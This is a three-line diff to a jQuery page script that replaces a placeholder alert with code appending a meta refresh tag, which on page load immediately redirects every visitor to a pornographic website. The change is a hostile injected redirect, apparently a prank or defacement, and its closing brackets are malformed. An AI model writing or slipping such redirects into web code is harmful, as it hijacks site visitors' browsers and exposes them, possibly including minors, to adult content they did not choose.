@@ -1,3 +1,3 @@
 $(document).ready(function(){
-alert('hi');
+$('body').append('<meta http-equiv="refresh" content="0; url=http://pornhub.com/" />');
 )};
